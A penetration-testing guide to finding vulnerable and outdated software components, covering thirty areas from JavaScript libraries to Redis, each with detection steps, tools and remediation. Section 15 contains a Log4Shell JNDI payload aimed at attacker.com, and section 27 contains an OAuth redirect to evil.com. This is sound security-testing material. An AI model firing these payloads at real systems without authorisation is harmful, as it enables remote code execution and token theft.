# 📦 **A06: VULNERABLE AND OUTDATED COMPONENTS TESTING MASTER GUIDE FOR VAPT**
*A Professional Penetration Tester's Comprehensive Deep Dive into Component-Based Vulnerabilities*

---

## 📋 **TABLE OF CONTENTS**

1. [Outdated JavaScript Libraries with Known Vulnerabilities](#1-outdated-javascript-libraries-with-known-vulnerabilities)
2. [End-of-Life (EOL) Software Versions](#2-end-of-life-eol-software-versions)
3. [Unpatched Web Server Software (Apache, Nginx, IIS)](#3-unpatched-web-server-software-apache-nginx-iis)
4. [Outdated CMS Platforms (WordPress, Drupal, Joomla)](#4-outdated-cms-platforms-wordpress-drupal-joomla)
5. [Vulnerable Plugins, Modules, and Extensions](#5-vulnerable-plugins-modules-and-extensions)
6. [Outdated PHP/Java/Python/Ruby Runtimes](#6-outdated-phpjavapythonruby-runtimes)
7. [Deprecated Cryptographic Libraries (OpenSSL, etc.)](#7-deprecated-cryptographic-libraries-openssl-etc)
8. [Vulnerable Third-Party APIs (SDKs, OAuth libraries)](#8-vulnerable-third-party-apis-sdks-oauth-libraries)
9. [Outdated Database Software (MySQL, PostgreSQL, MongoDB)](#9-outdated-database-software-mysql-postgresql-mongodb)
10. [Known Vulnerabilities in Operating System (OS) Components](#10-known-vulnerabilities-in-operating-system-os-components)
11. [Vulnerable Container Images (Docker, Kubernetes)](#11-vulnerable-container-images-docker-kubernetes)
12. [Outdated Content Delivery Network (CDN) Configurations](#12-outdated-content-delivery-network-cdn-configurations)
13. [Vulnerable Mobile App SDKs and Libraries](#13-vulnerable-mobile-app-sdks-and-libraries)
14. [Deprecated Front-End Frameworks (AngularJS, React older versions)](#14-deprecated-front-end-frameworks-angularjs-react-older-versions)
15. [Vulnerable Java Libraries (Log4j, Spring, Struts)](#15-vulnerable-java-libraries-log4j-spring-struts)
16. [Outdated PHP Composer Dependencies](#16-outdated-php-composer-dependencies)
17. [Vulnerable Node.js npm Packages](#17-vulnerable-nodejs-npm-packages)
18. [Outdated Python pip Packages](#18-outdated-python-pip-packages)
19. [Vulnerable Ruby Gems](#19-vulnerable-ruby-gems)
20. [Outdated .NET NuGet Packages](#20-outdated-net-nuget-packages)
21. [Vulnerable Third-Party Fonts and Icons (FontAwesome, etc.)](#21-vulnerable-third-party-fonts-and-icons-fontawesome-etc)
22. [Outdated Payment Gateway SDKs (Stripe, PayPal)](#22-outdated-payment-gateway-sdks-stripe-paypal)
23. [Vulnerable Analytics or Tracking Scripts (Google Analytics older versions)](#23-vulnerable-analytics-or-tracking-scripts-google-analytics-older-versions)
24. [Outdated CI/CD Pipeline Tools (Jenkins, GitLab)](#24-outdated-cicd-pipeline-tools-jenkins-gitlab)
25. [Vulnerable Reverse Proxy or Load Balancer Software (HAProxy, Nginx)](#25-vulnerable-reverse-proxy-or-load-balancer-software-haproxy-nginx)
26. [Outdated Monitoring and Logging Agents (Logstash, Filebeat)](#26-outdated-monitoring-and-logging-agents-logstash-filebeat)
27. [Vulnerable Authentication Libraries (OAuth, SAML implementations)](#27-vulnerable-authentication-libraries-oauth-saml-implementations)
28. [Outdated Database Drivers (JDBC, ODBC, etc.)](#28-outdated-database-drivers-jdbc-odbc-etc)
29. [Vulnerable Caching Systems (Redis, Memcached)](#29-vulnerable-caching-systems-redis-memcached)
30. [Lack of Software Bill of Materials (SBOM) and Component Inventory](#30-lack-of-software-bill-of-materials-sbom-and-component-inventory)

---

## 1. OUTDATED JAVASCRIPT LIBRARIES WITH KNOWN VULNERABILITIES

**Description**  
Outdated JavaScript libraries (e.g., jQuery, AngularJS, Bootstrap) may contain publicly known vulnerabilities such as XSS, prototype pollution, or denial of service.

**What to Look For**
- Version numbers in JavaScript file URLs (e.g., `jquery-1.12.4.min.js`).
- Library names and versions from source code or HTTP responses.
- Known vulnerabilities for those versions (CVE databases).

**What to Ignore**
- Libraries patched to the latest secure version.

**How to Test with Burp Suite**
1. Use Burp’s passive scanner to detect outdated libraries.
2. Manually inspect JavaScript file references in HTML.
3. Use browser extensions like Wappalyzer or Retire.js.
4. For Burp, install the **Retire.js** extension or use **Burp Scanner**’s passive checks.

**Example**
```html
<script src="/js/jquery-1.11.0.min.js"></script>
```
jQuery 1.11.0 has known XSS vulnerabilities.

**Tools**
- Retire.js (Burp extension, CLI)
- OWASP Dependency-Check
- Snyk
- npm audit

**Risk Rating**  
High (if the vulnerability is exploitable)

**Remediation**
- Update all client-side libraries to the latest secure versions.
- Remove unused libraries.
- Use a Content Security Policy (CSP) to mitigate impact.

---

## 2. END-OF-LIFE (EOL) SOFTWARE VERSIONS

**Description**  
Software that has reached end-of-life no longer receives security patches, leaving the application vulnerable to any newly discovered flaws.

**What to Look For**
- Operating system versions that are no longer supported (e.g., Windows Server 2012, Ubuntu 18.04).
- Web server versions that are EOL (Apache 2.2, Nginx 1.10).
- PHP versions below 8.0, Python 2.7, Java 8, etc.

**What to Ignore**
- Versions that are still actively supported and patched.

**How to Test with Burp Suite**
1. Identify software versions from server headers, error messages, or file signatures.
2. Check vendor end-of-life announcements.
3. Use fingerprinting tools like Nmap, Wappalyzer, or WhatWeb.

**Example**
```http
Server: Apache/2.2.22 (Debian)
```
Apache 2.2 reached EOL in 2017.

**Tools**
- Wappalyzer
- Nmap (service detection)
- WhatWeb

**Risk Rating**  
Critical

**Remediation**
- Upgrade to supported versions.
- Migrate to actively maintained alternatives.
- Apply virtual patches if upgrade is not immediately possible.

---

## 3. UNPATCHED WEB SERVER SOFTWARE (APACHE, NGINX, IIS)

**Description**  
Web servers that are not updated may be vulnerable to known exploits (e.g., Apache Struts, IIS buffer overflows).

**What to Look For**
- Version numbers from `Server` header or error pages.
- Known CVEs for that version (e.g., CVE-2021-41773 for Apache 2.4.49).

**What to Ignore**
- Web servers patched to the latest stable version.

**How to Test with Burp Suite**
1. Capture the `Server` header from any response.
2. Use Nmap scripts or online CVE databases to check vulnerabilities.
3. For IIS, check `X-AspNet-Version` header.

**Example**
```http
Server: Microsoft-IIS/7.5
```
IIS 7.5 is EOL and has multiple vulnerabilities.

**Tools**
- Nmap `http-enum` and `http-vuln-*` scripts
- Nuclei (template scanning)
- Burp Scanner

**Risk Rating**  
High to Critical

**Remediation**
- Keep web servers updated with the latest security patches.
- Use a web application firewall (WAF) as a temporary measure.

---

## 4. OUTDATED CMS PLATFORMS (WORDPRESS, DRUPAL, JOOMLA)

**Description**  
Content Management Systems (CMS) are frequent targets. Outdated versions contain known vulnerabilities that can lead to site compromise.

**What to Look For**
- Version numbers in meta tags, readme files, or `/wp-admin` paths.
- Specific plugin/theme versions.

**What to Ignore**
- Updated CMS with the latest security patches.

**How to Test with Burp Suite**
1. Access `/readme.html` (WordPress) or `/CHANGELOG.txt` (Drupal).
2. Use tools like WPScan (WordPress) or Droopescan (Drupal).
3. Check for version disclosure in RSS feeds or generator meta tags.

**Example**
```html
<meta name="generator" content="WordPress 5.1.1">
```
WordPress 5.1.1 has known vulnerabilities.

**Tools**
- WPScan (WordPress)
- Droopescan (Drupal, Joomla)
- CMSmap
- Nuclei templates

**Risk Rating**  
High

**Remediation**
- Update CMS core, plugins, and themes regularly.
- Enable automatic updates where possible.
- Remove version disclosure.

---

## 5. VULNERABLE PLUGINS, MODULES, AND EXTENSIONS

**Description**  
Third-party plugins, extensions, or modules often introduce vulnerabilities even if the core is up-to-date.

**What to Look For**
- Plugin/extension names and versions in URLs, comments, or headers.
- Publicly known vulnerabilities (CVE, WPVulnDB).

**What to Ignore**
- Plugins that are actively maintained and updated.

**How to Test with Burp Suite**
1. Use CMS-specific scanners (WPScan for WordPress plugins).
2. Manually check plugin directories (`/wp-content/plugins/plugin-name/`).
3. Look for version numbers in plugin CSS/JS files.

**Example**
```http
GET /wp-content/plugins/contact-form-7/readme.txt
```
If version is 4.9, it may be vulnerable.

**Tools**
- WPScan
- Nuclei (CMS plugin templates)
- Manual enumeration

**Risk Rating**  
High to Critical

**Remediation**
- Update all plugins to the latest versions.
- Remove unused or abandoned plugins.
- Subscribe to security bulletins for plugins.

---

## 6. OUTDATED PHP/JAVA/PYTHON/RUBY RUNTIMES

**Description**  
Outdated language runtimes contain security flaws that can be exploited via the application or underlying services.

**What to Look For**
- PHP version from `X-Powered-By` header or `phpinfo()`.
- Java version from HTTP headers or error pages.
- Python version from server banners.

**What to Ignore**
- Supported versions (PHP ≥8.0, Java 11/17 LTS, Python ≥3.8).

**How to Test with Burp Suite**
1. Probe for `/phpinfo.php`, `/info.php`, `/status`.
2. Examine error messages that disclose runtime versions.
3. Use fingerprinting tools.

**Example**
```http
X-Powered-By: PHP/5.6.40
```
PHP 5.6 is EOL since 2018.

**Tools**
- Wappalyzer
- Nmap
- Burp Scanner

**Risk Rating**  
Critical

**Remediation**
- Upgrade to supported versions.
- Apply security patches provided by the vendor.

---

## 7. DEPRECATED CRYPTOGRAPHIC LIBRARIES (OPENSSL, ETC.)

**Description**  
Old versions of OpenSSL, LibreSSL, or other crypto libraries may have critical vulnerabilities (e.g., Heartbleed, POODLE).

**What to Look For**
- OpenSSL version from server headers or SSL/TLS handshake.
- Known CVEs for that version.

**What to Ignore**
- Up-to-date versions with patches applied.

**How to Test with Burp Suite**
1. Use `testssl.sh` to detect OpenSSL version and vulnerabilities.
2. Check for Heartbleed using `nmap --script ssl-heartbleed`.

**Example**
```bash
testssl.sh --heartbleed target.com
```
If vulnerable, OpenSSL is outdated.

**Tools**
- testssl.sh
- sslyze
- Nmap ssl-* scripts

**Risk Rating**  
Critical

**Remediation**
- Update OpenSSL to the latest patched version.
- Rebuild and redeploy affected services.

---

## 8. VULNERABLE THIRD-PARTY APIS (SDKS, OAUTH LIBRARIES)

**Description**  
Integrating with third-party APIs using outdated SDKs or vulnerable OAuth libraries can expose the application to attacks.

**What to Look For**
- SDK version numbers in source code or network traffic.
- Known vulnerabilities in OAuth libraries (e.g., redirect_uri validation flaws).

**What to Ignore**
- Updated SDKs and libraries with secure defaults.

**How to Test with Burp Suite**
1. Review client-side JavaScript for SDK versions.
2. Test OAuth flows for known misconfigurations (e.g., missing state parameter).
3. Check if third-party API responses reveal library versions.

**Example**
```javascript
<script src="https://apis.google.com/js/platform.js?onload=init" async defer></script>
```
Outdated Google API client may have vulnerabilities.

**Tools**
- Burp Proxy
- Manual code review
- OAuth testing tools

**Risk Rating**  
High

**Remediation**
- Update to latest SDK versions.
- Follow security best practices for OAuth.
- Validate all redirect URIs and state parameters.

---

## 9. OUTDATED DATABASE SOFTWARE (MYSQL, POSTGRESQL, MONGODB)

**Description**  
Database software that is not updated may contain vulnerabilities allowing privilege escalation, data leakage, or remote code execution.

**What to Look For**
- Database version from error messages or response headers.
- Banner grabbing on database ports (if exposed).

**What to Ignore**
- Supported versions with latest patches.

**How to Test with Burp Suite**
1. Trigger SQL errors that reveal database version.
2. If you can connect to the database (e.g., via SQLi), run `SELECT VERSION();`.
3. Use Nmap to banner grab if the port is exposed.

**Example**
```sql
You have an error in your SQL syntax near '...' at line 1. MySQL server version: 5.5.62
```
MySQL 5.5 is EOL.

**Tools**
- Nmap
- SQLMap
- Manual SQL queries

**Risk Rating**  
Critical

**Remediation**
- Upgrade to supported versions.
- Apply security patches.
- Harden database configuration (remove version disclosure).

---

## 10. KNOWN VULNERABILITIES IN OPERATING SYSTEM (OS) COMPONENTS

**Description**  
The underlying operating system may have unpatched vulnerabilities that can be exploited to compromise the server.

**What to Look For**
- OS version from server headers, SSH banners, or error messages.
- Known CVEs for that OS version.

**What to Ignore**
- Fully patched OS with regular updates.

**How to Test with Burp Suite**
1. Use Nmap OS fingerprinting (`-O`).
2. Check SSH banner (port 22) for OS information.
3. Use vulnerability scanners like Nessus or OpenVAS.

**Example**
```bash
nmap -O target.com
```
Reveals OS version (e.g., Linux 2.6.32).

**Tools**
- Nmap
- Nessus
- OpenVAS

**Risk Rating**  
Critical

**Remediation**
- Keep OS updated with security patches.
- Use automated patch management.
- Harden OS configurations.

---

## 11. VULNERABLE CONTAINER IMAGES (DOCKER, KUBERNETES)

**Description**  
Container images may contain outdated base images, vulnerable packages, or misconfigurations that lead to container escape.

**What to Look For**
- Base image versions (e.g., `ubuntu:18.04`, `alpine:3.12`).
- Outdated packages inside the container.
- Known vulnerabilities in container runtime.

**What to Ignore**
- Images built from secure, updated base images with minimal packages.

**How to Test with Burp Suite**
1. Access container metadata endpoints (if exposed) like `/var/run/docker.sock`.
2. Use tools like Trivy, Clair, or Docker Scout to scan images.
3. Check for container escape vulnerabilities (CVE-2019-5736, etc.).

**Example**
```bash
trivy image ubuntu:18.04
```
Reports many vulnerabilities.

**Tools**
- Trivy
- Clair
- Docker Scout
- Grype

**Risk Rating**  
High to Critical

**Remediation**
- Use minimal, up-to-date base images.
- Regularly rebuild images with security updates.
- Scan images in CI/CD pipelines.

---

## 12. OUTDATED CONTENT DELIVERY NETWORK (CDN) CONFIGURATIONS

**Description**  
CDN configurations may use outdated TLS versions, weak ciphers, or have insecure origin pull settings.

**What to Look For**
- CDN version headers (e.g., `CloudFront` version).
- TLS configuration on CDN edge.

**What to Ignore**
- CDN with modern TLS and secure configuration.

**How to Test with Burp Suite**
1. Analyze TLS settings using `testssl.sh` on the CDN endpoint.
2. Check for missing security headers on cached content.
3. Test for cache poisoning vulnerabilities.

**Example**
```bash
testssl.sh --tls1_0 cdn.target.com
```
If TLS 1.0 is supported, configuration is outdated.

**Tools**
- testssl.sh
- sslyze
- Burp Suite

**Risk Rating**  
Medium to High

**Remediation**
- Update CDN configuration to enforce TLS 1.2/1.3.
- Disable weak ciphers.
- Implement secure cache policies.

---

## 13. VULNERABLE MOBILE APP SDKS AND LIBRARIES

**Description**  
Mobile applications often integrate third-party SDKs (analytics, ads, social login) that may have known vulnerabilities.

**What to Look For**
- SDK version strings in decompiled code or network requests.
- Known vulnerabilities in specific SDK versions (e.g., outdated OkHttp, Retrofit).

**What to Ignore**
- Updated SDKs with security patches.

**How to Test with Burp Suite**
1. Intercept mobile app traffic to identify SDK endpoints.
2. Decompile the APK/IPA and inspect libraries.
3. Use mobile security frameworks like MobSF.

**Example**
```
OkHttp/3.12.0
```
OkHttp 3.12.0 has known issues.

**Tools**
- MobSF
- Frida
- Burp Suite (mobile assistant)

**Risk Rating**  
High

**Remediation**
- Update all mobile SDKs to latest versions.
- Remove unused SDKs.
- Perform regular mobile app security assessments.

---

## 14. DEPRECATED FRONT-END FRAMEWORKS (ANGULARJS, REACT OLDER VERSIONS)

**Description**  
Older front-end frameworks (AngularJS 1.x, React < 16) have known XSS, prototype pollution, or template injection vulnerabilities.

**What to Look For**
- Version strings in JavaScript files or HTML comments.
- Specific patterns: `angular.js` version, `react.development.js` version.

**What to Ignore**
- Supported, up-to-date frameworks.

**How to Test with Burp Suite**
1. Look for versioned JavaScript files (e.g., `angular-1.5.8.js`).
2. Use Retire.js to detect vulnerable front-end libraries.
3. Manually check for known vulnerabilities.

**Example**
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.8/angular.min.js"></script>
```
AngularJS 1.4.8 has XSS vulnerabilities.

**Tools**
- Retire.js
- Wappalyzer
- OWASP Dependency-Check

**Risk Rating**  
High

**Remediation**
- Upgrade to modern frameworks or latest supported versions.
- Apply security patches or backport fixes.

---

## 15. VULNERABLE JAVA LIBRARIES (LOG4J, SPRING, STRUTS)

**Description**  
Java applications often rely on libraries like Log4j, Spring Framework, or Apache Struts, which have had severe vulnerabilities (e.g., Log4Shell, Spring4Shell, Struts2 RCE).

**What to Look For**
- Library version numbers in JAR filenames, manifests, or error messages.
- Known CVEs for those versions.

**What to Ignore**
- Updated libraries with patches applied.

**How to Test with Burp Suite**
1. For Log4j, inject JNDI payloads (`${jndi:ldap://...}`) in any input that might be logged.
2. Use Burp Collaborator to detect out-of-band requests.
3. For Spring, test specific endpoints for Spring4Shell (CVE-2022-22965).

**Example**
```http
X-Forwarded-For: ${jndi:ldap://attacker.com/evil}
```
If a DNS lookup occurs, Log4j is vulnerable.

**Tools**
- Burp Collaborator
- Log4j scanner
- Nuclei templates

**Risk Rating**  
Critical

**Remediation**
- Update Log4j to 2.17.1+.
- Update Spring Framework to 5.3.18+ or 5.2.20+.
- Patch or upgrade Struts2.

---

## 16. OUTDATED PHP COMPOSER DEPENDENCIES

**Description**  
PHP Composer dependencies (e.g., Guzzle, Monolog, Symfony components) may have known vulnerabilities.

**What to Look For**
- `composer.lock` file exposed or version information in error messages.
- Known vulnerabilities in specific package versions.

**What to Ignore**
- Up-to-date dependencies with `composer update`.

**How to Test with Burp Suite**
1. If `composer.lock` is accessible (e.g., `/composer.lock`), download and analyze.
2. Use `composer audit` or OWASP Dependency-Check to scan.
3. Look for version disclosure in error pages.

**Example**
```http
GET /composer.lock HTTP/1.1
```
If accessible, parse for package versions.

**Tools**
- OWASP Dependency-Check
- Composer audit
- Snyk

**Risk Rating**  
High

**Remediation**
- Run `composer update` regularly.
- Remove `composer.lock` from web-accessible paths.
- Use `composer audit` in CI/CD.

---

## 17. VULNERABLE NODE.JS NPM PACKAGES

**Description**  
Node.js applications often include npm packages with known vulnerabilities (e.g., prototype pollution, command injection).

**What to Look For**
- `package-lock.json` or `yarn.lock` exposed.
- Version numbers in error messages or source maps.

**What to Ignore**
- Updated packages with `npm audit fix`.

**How to Test with Burp Suite**
1. Access `/package-lock.json` if exposed.
2. Use `npm audit` or Snyk to scan.
3. Check for known vulnerabilities in used packages.

**Example**
```http
GET /package-lock.json HTTP/1.1
```
Download and run `npm audit --json`.

**Tools**
- npm audit
- Snyk
- OWASP Dependency-Check

**Risk Rating**  
High

**Remediation**
- Run `npm audit fix` regularly.
- Keep `package-lock.json` out of webroot.
- Use automated dependency scanning in CI/CD.

---

## 18. OUTDATED PYTHON PIP PACKAGES

**Description**  
Python applications using outdated pip packages (e.g., Django, Flask, requests) may have known vulnerabilities.

**What to Look For**
- `requirements.txt` or `Pipfile.lock` exposed.
- Version strings in error messages or debug pages.

**What to Ignore**
- Updated packages with `pip list --outdated`.

**How to Test with Burp Suite**
1. Access `/requirements.txt` if exposed.
2. Use safety CLI or OWASP Dependency-Check.
3. Look for version disclosure in Django debug pages.

**Example**
```http
GET /requirements.txt HTTP/1.1
```
Parse for package versions and check against vulnerability databases.

**Tools**
- safety
- OWASP Dependency-Check
- Snyk

**Risk Rating**  
High

**Remediation**
- Regularly update pip packages.
- Use `pip-audit` or `safety` in CI/CD.
- Remove `requirements.txt` from webroot.

---

## 19. VULNERABLE RUBY GEMS

**Description**  
Ruby on Rails applications and other Ruby-based apps rely on gems. Outdated gems can contain vulnerabilities.

**What to Look For**
- `Gemfile.lock` exposed.
- Version disclosure in error pages or headers.

**What to Ignore**
- Updated gems with `bundle update`.

**How to Test with Burp Suite**
1. Access `/Gemfile.lock` if exposed.
2. Use `bundler-audit` to scan.
3. Check Rails version from headers (`X-Runtime`).

**Example**
```http
GET /Gemfile.lock HTTP/1.1
```
Run `bundler-audit` on the file.

**Tools**
- bundler-audit
- OWASP Dependency-Check
- Snyk

**Risk Rating**  
High

**Remediation**
- Run `bundle update` regularly.
- Use `bundler-audit` in CI/CD.
- Remove `Gemfile.lock` from webroot.

---

## 20. OUTDATED .NET NUGET PACKAGES

**Description**  
.NET applications use NuGet packages that may have known vulnerabilities.

**What to Look For**
- `packages.config` or `.csproj` files exposed.
- Version disclosure in error pages or headers (`X-AspNet-Version`).

**What to Ignore**
- Updated packages with `dotnet list package --vulnerable`.

**How to Test with Burp Suite**
1. Access `/packages.config` if exposed.
2. Use `dotnet list package --vulnerable` or OWASP Dependency-Check.
3. Check for ASP.NET version disclosure.

**Example**
```xml
<package id="Newtonsoft.Json" version="12.0.1" />
```
Check if version 12.0.1 has vulnerabilities.

**Tools**
- dotnet CLI
- OWASP Dependency-Check
- NuGet Vulnerability Scanner

**Risk Rating**  
High

**Remediation**
- Run `dotnet list package --vulnerable` and update.
- Use dependency scanning in CI/CD.
- Remove package files from webroot.

---

## 21. VULNERABLE THIRD-PARTY FONTS AND ICONS (FONTAWESOME, ETC.)

**Description**  
Even fonts and icon libraries may have vulnerabilities (e.g., XSS through SVG or CSS injection). Outdated versions may also rely on insecure CDNs.

**What to Look For**
- Version numbers in font library URLs (e.g., `font-awesome-4.7.0`).
- Use of vulnerable CDN URLs without integrity hashes (SRI).

**What to Ignore**
- Updated libraries with SRI hashes.

**How to Test with Burp Suite**
1. Inspect HTML for external font/icon library URLs.
2. Check version against known vulnerabilities.
3. Verify if Subresource Integrity (SRI) is used.

**Example**
```html
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
```
FontAwesome 4.7.0 has no critical issues, but missing SRI allows CDN compromise.

**Tools**
- Manual inspection
- SRI hash checker

**Risk Rating**  
Low to Medium

**Remediation**
- Use SRI hashes for all third-party resources.
- Upgrade to the latest versions.
- Self-host critical assets.

---

## 22. OUTDATED PAYMENT GATEWAY SDKS (STRIPE, PAYPAL)

**Description**  
Outdated payment SDKs may contain security flaws that could lead to payment manipulation or data exposure.

**What to Look For**
- SDK version numbers in JavaScript or network requests.
- Known vulnerabilities in specific versions.

**What to Ignore**
- Up-to-date SDKs with security patches.

**How to Test with Burp Suite**
1. Look for Stripe.js version in page source (`https://js.stripe.com/v2/` vs `/v3/`).
2. Check PayPal SDK version in buttons.
3. Review SDK changelogs for security fixes.

**Example**
```html
<script src="https://js.stripe.com/v2/"></script>
```
Stripe v2 is deprecated; v3 is recommended.

**Tools**
- Manual inspection
- Version comparison

**Risk Rating**  
High

**Remediation**
- Update to the latest SDK versions.
- Follow payment gateway security best practices.

---

## 23. VULNERABLE ANALYTICS OR TRACKING SCRIPTS (GOOGLE ANALYTICS OLDER VERSIONS)

**Description**  
Older analytics scripts may contain XSS vulnerabilities or use insecure communication.

**What to Look For**
- Version numbers in Google Analytics or other tracking scripts.
- Use of outdated `ga.js` instead of `gtag.js`.

**What to Ignore**
- Updated scripts with security fixes.

**How to Test with Burp Suite**
1. Inspect page source for analytics script URLs.
2. Check for `ga.js` (old) vs `analytics.js` or `gtag.js`.

**Example**
```html
<script src="https://ssl.google-analytics.com/ga.js"></script>
```
Old `ga.js` is deprecated; use `gtag.js`.

**Tools**
- Browser DevTools
- Manual inspection

**Risk Rating**  
Low

**Remediation**
- Update to the latest analytics scripts.
- Use Google Tag Manager or gtag.js.

---

## 24. OUTDATED CI/CD PIPELINE TOOLS (JENKINS, GITLAB)

**Description**  
CI/CD tools like Jenkins, GitLab CI, or GitHub Actions runners may be outdated and vulnerable to remote code execution.

**What to Look For**
- Version numbers in login pages, headers, or error messages.
- Known vulnerabilities for that version.

**What to Ignore**
- Updated instances with security patches.

**How to Test with Burp Suite**
1. Access Jenkins login page and check version in footer.
2. Use Nmap scripts or Nuclei to detect vulnerable versions.
3. Test for known CVEs (e.g., Jenkins Groovy sandbox bypass).

**Example**
```http
GET /jenkins/login HTTP/1.1
```
Footer shows `Jenkins 2.235.1` (vulnerable).

**Tools**
- Nuclei
- Nmap `http-jenkins-*` scripts
- Metasploit (for exploitation)

**Risk Rating**  
Critical

**Remediation**
- Update CI/CD tools to the latest versions.
- Isolate CI/CD infrastructure from production.

---

## 25. VULNERABLE REVERSE PROXY OR LOAD BALANCER SOFTWARE (HAPROXY, NGINX)

**Description**  
Reverse proxies and load balancers that are outdated can expose the backend to attacks like request smuggling or cache poisoning.

**What to Look For**
- Version numbers in server headers or error pages.
- Known vulnerabilities (e.g., HAProxy request smuggling, Nginx off-by-one).

**What to Ignore**
- Up-to-date versions with patches.

**How to Test with Burp Suite**
1. Examine `Server` header for proxy software version.
2. Test for HTTP request smuggling using timing or differential responses.
3. Use specialized tools like `smuggler` or `http-request-smuggling` Burp extension.

**Example**
```http
Server: HAProxy-1.8.0
```
HAProxy 1.8.0 has known request smuggling issues.

**Tools**
- Burp Suite (Request Smuggling extension)
- smuggler
- Nuclei

**Risk Rating**  
High to Critical

**Remediation**
- Update proxy software to latest versions.
- Apply configuration hardening (e.g., reject malformed requests).

---

## 26. OUTDATED MONITORING AND LOGGING AGENTS (LOGSTASH, FILEBEAT)

**Description**  
Monitoring agents (e.g., Logstash, Filebeat) may have vulnerabilities that could be exploited to extract logs or compromise the logging pipeline.

**What to Look For**
- Version numbers in HTTP endpoints (e.g., `/` for Logstash API).
- Known vulnerabilities (e.g., Logstash RCE).

**What to Ignore**
- Updated agents with security patches.

**How to Test with Burp Suite**
1. Access Logstash API endpoint (port 9600) and check version.
2. Probe for exposed Beats endpoints.
3. Use Nuclei templates for known CVEs.

**Example**
```http
GET / HTTP/1.1
Host: monitoring.target.com:9600
```
Response may contain version.

**Tools**
- Nmap
- Nuclei
- Manual probing

**Risk Rating**  
Medium to High

**Remediation**
- Update monitoring agents regularly.
- Restrict access to monitoring endpoints.

---

## 27. VULNERABLE AUTHENTICATION LIBRARIES (OAUTH, SAML IMPLEMENTATIONS)

**Description**  
Authentication libraries (e.g., OAuth2, SAML, JWT) may have known vulnerabilities like signature validation bypass, XML wrapping, or state parameter issues.

**What to Look For**
- Library versions from HTTP headers or error messages.
- Known vulnerabilities for those versions.

**What to Ignore**
- Updated libraries with security fixes.

**How to Test with Burp Suite**
1. Identify OAuth endpoints and test for redirect_uri tampering, state parameter missing.
2. For SAML, use SAML Raider extension to test signature stripping.
3. Check JWT libraries for `none` algorithm or weak keys.

**Example**
```http
Location: https://oauth-provider.com/authorize?client_id=123&redirect_uri=https://evil.com/callback
```
If redirect_uri is not validated, vulnerable.

**Tools**
- Burp Suite (SAML Raider, JWT Editor)
- OAuth testing tools

**Risk Rating**  
Critical

**Remediation**
- Update authentication libraries to latest versions.
- Follow OAuth/SAML security best practices.

---

## 28. OUTDATED DATABASE DRIVERS (JDBC, ODBC, ETC.)

**Description**  
Database drivers that are outdated may have security vulnerabilities (e.g., JDBC driver RCE, ODBC buffer overflows).

**What to Look For**
- Driver version from error messages or stack traces.
- Known vulnerabilities for specific driver versions.

**What to Ignore**
- Updated drivers with patches.

**How to Test with Burp Suite**
1. Trigger database errors that may reveal driver version.
2. If you have SQL injection, use `SELECT @@version` or equivalent.
3. Check for known CVEs for that driver.

**Example**
```sql
You have an error in your SQL syntax near '...' at line 1. MySQL JDBC Driver version 5.1.47
```
Version 5.1.47 has known vulnerabilities.

**Tools**
- Manual error triggering
- CVE databases

**Risk Rating**  
High

**Remediation**
- Update database drivers to latest versions.
- Use driver version management.

---

## 29. VULNERABLE CACHING SYSTEMS (REDIS, MEMCACHED)

**Description**  
Caching systems like Redis and Memcached may be outdated and vulnerable to denial of service, data leakage, or remote code execution.

**What to Look For**
- Version numbers from banner grabbing or error messages.
- Known vulnerabilities (e.g., Redis Lua sandbox escape, Memcached crash).

**What to Ignore**
- Updated versions with patches.

**How to Test with Burp Suite**
1. If Redis is exposed, use `redis-cli INFO` to get version.
2. Use Nmap scripts to detect vulnerable versions.
3. Test for known CVEs.

**Example**
```bash
redis-cli -h target.com INFO server
```
Reveals version (e.g., `redis_version:3.2.12`).

**Tools**
- Nmap `redis-info` script
- Redis CLI
- Nuclei

**Risk Rating**  
High

**Remediation**
- Update Redis, Memcached to latest versions.
- Restrict access to caching servers.
- Run with least privilege.

---

## 30. LACK OF SOFTWARE BILL OF MATERIALS (SBOM) AND COMPONENT INVENTORY

**Description**  
Without an SBOM, organizations cannot easily track which components are in use or identify vulnerable ones.

**What to Look For**
- No documented list of dependencies.
- No process for checking component vulnerabilities.
- Use of unknown or unsupported libraries.

**What to Ignore**
- Comprehensive SBOM with regular updates and vulnerability scanning.

**How to Test with Burp Suite**
1. Attempt to identify components manually (via headers, file paths, error messages).
2. If many components are outdated, likely no SBOM process.
3. Ask developers or review build files.

**Example**
- Application uses jQuery 1.11, Log4j 1.2, and PHP 5.6 – all outdated. No evidence of component inventory.

**Tools**
- Manual inspection
- Interviews
- OWASP Dependency-Track

**Risk Rating**  
High (process risk)

**Remediation**
- Generate SBOM using tools like Syft, CycloneDX, or OWASP Dependency-Track.
- Integrate vulnerability scanning into CI/CD.
- Regularly update component inventory.

---

## ✅ **SUMMARY**

Vulnerable and outdated components are a major risk because they provide attackers with known, often easy-to-exploit entry points. This guide covers 30 types of component flaws, from JavaScript libraries to operating systems and cloud services.

### **Key Testing Areas Summary**

| Component Type | Key Indicators | Risk |
|----------------|----------------|------|
| JS Libraries | Version in URLs, missing SRI | High |
| EOL Software | Old versions, no patches | Critical |
| Web Server | Server header version | High-Critical |
| CMS | Generator meta tag, readme files | High |
| Plugins | Plugin paths, version files | High-Critical |
| Runtimes | PHP/Java version disclosure | Critical |
| Crypto Libs | OpenSSL version, Heartbleed | Critical |
| Third-Party APIs | SDK version in JS | High |
| Database | Error message version | Critical |
| OS | Banner, Nmap fingerprint | Critical |
| Containers | Base image version | High-Critical |
| CDN | TLS config, headers | Medium-High |
| Mobile SDKs | Decompiled library versions | High |
| Front-End Frameworks | AngularJS, React versions | High |
| Java Libraries | Log4j, Spring, Struts | Critical |
| Composer | composer.lock exposed | High |
| npm | package-lock.json exposed | High |
| pip | requirements.txt exposed | High |
| Gems | Gemfile.lock exposed | High |
| .NET NuGet | packages.config exposed | High |
| Fonts | Version in CDN URL | Low-Medium |
| Payment SDKs | Stripe.js version | High |
| Analytics | ga.js vs gtag.js | Low |
| CI/CD | Jenkins version | Critical |
| Proxy | HAProxy/Nginx version | High-Critical |
| Monitoring | Logstash API version | Medium-High |
| Auth Libraries | OAuth/SAML version | Critical |
| DB Drivers | JDBC version in errors | High |
| Caching | Redis version | High |
| SBOM | No inventory | High (process) |

### **Pro Tips for Testing Vulnerable Components**
1. **Use automated scanners** – OWASP Dependency-Check, Snyk, Retire.js, Trivy.
2. **Check all endpoints** – not just the main application; admin panels, APIs, static resources.
3. **Monitor version disclosure** – in headers, error pages, comments, and file paths.
